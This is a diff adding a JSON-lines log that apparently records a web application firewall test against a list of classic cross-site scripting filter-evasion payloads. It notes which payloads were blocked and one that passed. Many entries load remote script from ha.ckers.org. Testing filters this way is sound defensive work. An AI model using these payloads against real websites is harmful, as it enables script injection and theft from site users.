@@ -1,0 +1,73 @@
+{"payload": "<SCRIPT>alert('XSS');</SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.009933162000379525}
+{"payload": "'';!--\"<XSS>=&{()}", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003792814997723326}
+{"payload": "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005065425997599959}
+{"payload": "<IMG SRC=\"javascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004876293009147048}
+{"payload": "<IMG SRC=javascript:alert('XSS')>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004851605001022108}
+{"payload": "<IMG SRC=JaVaScRiPt:alert('XSS')>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004960569000104442}
+{"payload": "<IMG SRC=javascript:alert(&quot;XSS&quot;)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005693775005056523}
+{"payload": "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004190229999949224}
+{"payload": "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003254124996601604}
+{"payload": "SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033533249952597544}
+{"payload": "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005507784997462295}
+{"payload": "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003904814991983585}
+{"payload": "<IMG SRC=\"jav\tascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003044780998607166}
+{"payload": "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0030441800045082346}
+{"payload": "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0046694539923919365}
+{"payload": "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003936640001484193}
+{"payload": "<IMG SRC=\" &#14;  javascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003591143002267927}
+{"payload": "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003209296992281452}
+{"payload": "<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005449949996545911}
+{"payload": "<IMG SRC=\"javascript:alert('XSS')\"", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005089233993203379}
+{"payload": "<SCRIPT>a=/XSS/", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003970124991610646}
+{"payload": "\\\";alert('XSS');//", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.014670285992906429}
+{"payload": "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005091008002636954}
+{"payload": "<BODY BACKGROUND=\"javascript:alert('XSS')\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007672653999179602}
+{"payload": "<BODY ONLOAD=alert('XSS')>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005516285993508063}
+{"payload": "<IMG DYNSRC=\"javascript:alert('XSS')\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.009199719002936035}
+{"payload": "<IMG LOWSRC=\"javascript:alert('XSS')\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0062990349979372695}
+{"payload": "<BGSOUND SRC=\"javascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005912741005886346}
+{"payload": "<BR SIZE=\"&{alert('XSS')}\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0062103439995553344}
+{"payload": "<LAYER SRC=\"http://ha.ckers.org/scriptlet.html\"></LAYER>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005241999009740539}
+{"payload": "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005439095999463461}
+{"payload": "<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006361906998790801}
+{"payload": "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0055846479954198}
+{"payload": "<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0059537600027397275}
+{"payload": "<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00557028099137824}
+{"payload": "<IMG SRC='vbscript:msgbox(\"XSS\")'>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004580460998113267}
+{"payload": "<IMG SRC=\"mocha:[code]\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007459702988853678}
+{"payload": "<IMG SRC=\"livescript:[code]\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00449425500119105}
+{"payload": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005607423998299055}
+{"payload": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006568575001438148}
+{"payload": "<META HTTP-EQUIV=\"Link\" Content=\"<javascript:alert('XSS')>; REL=stylesheet\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005007735991966911}
+{"payload": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007154254009947181}
+{"payload": "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006348522991174832}
+{"payload": "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005110243000672199}
+{"payload": "<TABLE BACKGROUND=\"javascript:alert('XSS')\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005270843001198955}
+{"payload": "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006735807997756638}
+{"payload": "<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005504665008629672}
+{"payload": "<DIV STYLE=\"width: expression(alert('XSS'));\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00493193999864161}
+{"payload": "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007983283008798026}
+{"payload": "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005442855006549507}
+{"payload": "<XSS STYLE=\"xss:expression(alert('XSS'))\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0066678480070549995}
+{"payload": "exp/*<XSS STYLE='no\\xss:noxss(\"*//*\");", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005912770007853396}
+{"payload": "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004983157996321097}
+{"payload": "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006082849999074824}
+{"payload": "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00702065801306162}
+{"payload": "<BASE HREF=\"javascript:alert('XSS');//\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.009147427990683354}
+{"payload": "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006078610007534735}
+{"payload": "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006765736994566396}
+{"payload": "getURL(\"javascript:alert('XSS')\")", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007174583995947614}
+{"payload": "a=\"get\";", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005454536993056536}
+{"payload": "<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas<![CDATA[cript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0069397600018419325}
+{"payload": "<XML SRC=\"http://ha.ckers.org/xsstest.xml\" ID=I></XML>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005358683993108571}
+{"payload": "<HTML><BODY>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004224104995955713}
+{"payload": "<SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0066380089992890134}
+{"payload": "<!--#exec cmd=\"/bin/echo '<SCRIPT SRC'\"--><!--#exec cmd=\"/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'\"-->", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005300663993693888}
+{"payload": "<? echo('<SCR)';", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004094430012628436}
+{"payload": "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007721710004261695}
+{"payload": "<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005207620997680351}
+{"payload": "<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0049170209967996925}
+{"payload": "<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.010604327995679341}
+{"payload": "<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005657337998854928}
+{"payload": "<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00848983900505118}
+{"payload": "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006632192002143711}
